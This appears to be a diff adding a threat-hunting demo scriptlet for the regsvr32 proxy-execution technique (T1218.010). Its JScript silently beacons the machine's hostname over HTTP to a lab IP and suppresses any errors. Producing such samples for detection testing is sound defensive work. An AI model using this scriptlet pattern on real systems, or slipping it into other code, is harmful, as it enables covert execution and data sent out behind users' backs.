@@ -1,0 +1,20 @@
+<?xml version="1.0"?>
+<scriptlet>
+  <registration
+    progid="ThreatHuntDemo"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
+  </registration>
+  <script language="JScript">
+  <![CDATA[
+    try {
+      var xhr = new ActiveXObject("Msxml2.ServerXMLHTTP");
+      var hostname = new ActiveXObject("WScript.Network").ComputerName;
+      var url = "http://192.168.1.15:8000/beacon?host=" + hostname + "&demo=T1218.010";
+      xhr.open("GET", url, false);
+      xhr.send();
+    } catch (e) {
+      // fail silently, this is just a demo
+    }
+  ]]>
+  </script>
+</scriptlet>
